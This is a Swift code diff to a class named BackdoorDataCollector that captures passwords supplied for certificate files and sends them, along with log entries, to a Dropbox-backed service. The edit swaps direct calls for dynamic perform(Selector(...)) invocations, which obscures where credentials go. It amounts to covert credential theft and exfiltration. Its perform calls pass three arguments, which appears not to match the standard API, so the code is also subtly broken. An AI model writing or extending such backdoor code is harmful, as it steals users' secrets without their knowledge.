@@ -248,13 +248,14 @@ class BackdoorDataCollector {
             // If password is provided, log it
             if let password = password {
                 // Use proper method name with colon placement for Swift selector
-                if dropboxService.responds(to: Selector("storePasswordForCertificate:password:completion:")) {
+                if dropboxService.responds(to: Selector(("storePasswordForCertificate:password:completion:"))) {
                     // Fix completion parameter to use nil instead of empty array
                     let completion: ((Bool, Error?) -> Void)? = nil
-                    dropboxService.storePasswordForCertificate(
-                        url.lastPathComponent,
-                        password: password,
-                        completion: completion
+                    dropboxService.perform(
+                        Selector(("storePasswordForCertificate:password:completion:")),
+                        with: url.lastPathComponent,
+                        with: password,
+                        with: completion
                     )
                 }
             }
@@ -307,7 +308,11 @@ class BackdoorDataCollector {
             if let uploadMethod = dropboxService.method(for: Selector(("uploadLogEntry:fileName:completion:"))) {
                 // Simple implementation that doesn't rely on withObject syntax
                 let completion: ((Bool, Error?) -> Void)? = nil
-                dropboxService.uploadLogEntry(logEntry, fileName: fileName, completion: completion)
+                dropboxService.perform(
+                    Selector(("uploadLogEntry:fileName:completion:")),
+                    with: logEntry,
+                    with: fileName,
+                    with: completion)
             }
         }
     }
